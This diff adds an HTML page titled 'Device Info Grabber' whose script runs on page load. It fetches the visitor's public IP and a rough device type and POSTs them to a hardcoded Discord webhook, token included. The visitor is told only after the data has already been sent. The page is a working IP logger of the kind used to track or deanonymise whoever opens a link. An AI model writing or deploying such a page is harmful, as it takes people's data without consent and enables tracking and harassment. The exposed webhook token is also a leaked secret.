@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Info Grabber</title>
+</head>
+<body>
+    <h1>Obteniendo información del dispositivo...</h1>
+    <script>
+        async function fetchIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return null;
+            }
+        }
+
+        function getDeviceName() {
+            const userAgent = navigator.userAgent;
+            let deviceName = 'Unknown Device';
+            if (/mobile/i.test(userAgent)) {
+                deviceName = 'Mobile Device';
+            } else if (/tablet/i.test(userAgent)) {
+                deviceName = 'Tablet';
+            } else {
+                deviceName = 'Desktop';
+            }
+            return deviceName;
+        }
+
+        async function sendToDiscord(ip, deviceName) {
+            const webhookURL = 'https://discord.com/api/webhooks/1391902818708885514/LUfvUa8fZFpBLbbaPuZYeu00cTzI_5zU434O05LYSRwJJS1HBUeAamyovY31Irl7lp4t'; // Reemplaza con tu URL de webhook
+            const payload = {
+                content: `IP Address: ${ip}\nDevice: ${deviceName}`
+            };
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Error sending message to Discord');
+                }
+            } catch (error) {
+                console.error('Error sending message to Discord:', error);
+            }
+        }
+
+        async function main() {
+            const ip = await fetchIP();
+            const deviceName = getDeviceName();
+
+            if (ip && deviceName) {
+                await sendToDiscord(ip, deviceName);
+                alert('Tu IP y tipo de dispositivo han sido enviados a Discord.');
+            } else {
+                alert('No se pudo obtener toda la información necesaria.');
+            }
+        }
+
+        main();
+    </script>
+</body>
+</html>
